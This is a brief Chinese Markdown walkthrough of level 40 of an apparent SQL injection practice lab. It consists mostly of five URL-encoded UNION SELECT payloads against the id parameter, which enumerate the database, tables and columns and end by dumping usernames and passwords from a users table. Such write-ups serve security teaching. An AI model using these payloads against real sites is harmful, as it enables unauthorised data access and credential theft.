# Less-40

四十关id参数是单引号加括号闭合，然后使用联合注入就可以了



~~~ cmd
?id=-1%27)%20union%20select%201,2,3--+
~~~

![Less-40-01](.\img\Less-40-01.png)



~~~~ cmd
?id=-1%27)%20union%20select%201,database(),version()--+
~~~~

![Less-40-02](.\img\Less-40-02.png)



~~~ cmd
?id=-1%27)%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-40-03](.\img\Less-40-03.png)



~~~ cmd
?id=-1%27)%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="users"--+
~~~

![Less-40-04](.\img\Less-40-04.png)



~~~ cmd
?id=-1%27)%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-40-05](.\img\Less-40-05.png)